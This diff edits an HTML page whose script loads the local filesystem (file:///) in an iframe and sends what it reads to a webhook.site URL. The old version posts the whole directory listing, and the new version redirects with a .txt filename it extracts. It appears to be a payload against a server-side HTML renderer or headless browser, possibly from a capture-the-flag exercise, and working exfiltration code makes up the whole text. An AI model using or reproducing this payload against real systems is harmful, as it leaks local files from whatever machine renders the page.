@@ -1,16 +1,11 @@
 <html>
-    <body>
-        <script>
-            i=document.createElement('iframe');
-            i.src='file:///';
-            i.onload = () => {
-                o = i.contentWindow.document.body.innerText;
-                fetch('https://webhook.site/a7fdf68e-746a-4080-adff-252471662266', {
-                    method: 'POST',
-                    body: `LEAKED: ${o}`
-                })
-            }
-            document.body.appendChild(i);
-        </script>
-    </body>
+    <body><script>
+    i=document.createElement('iframe');
+    i.src='file:///';
+    i.onload = () => {
+        let o = i.contentWindow.document.body.innerText.match(/([^\/]+\.txt)/);
+        location.href = 'https://webhook.site/a7fdf68e-746a-4080-adff-252471662266?x'+encodeURI(o);
+    }
+    document.body.appendChild(i);
+    </script></body>
 </html>
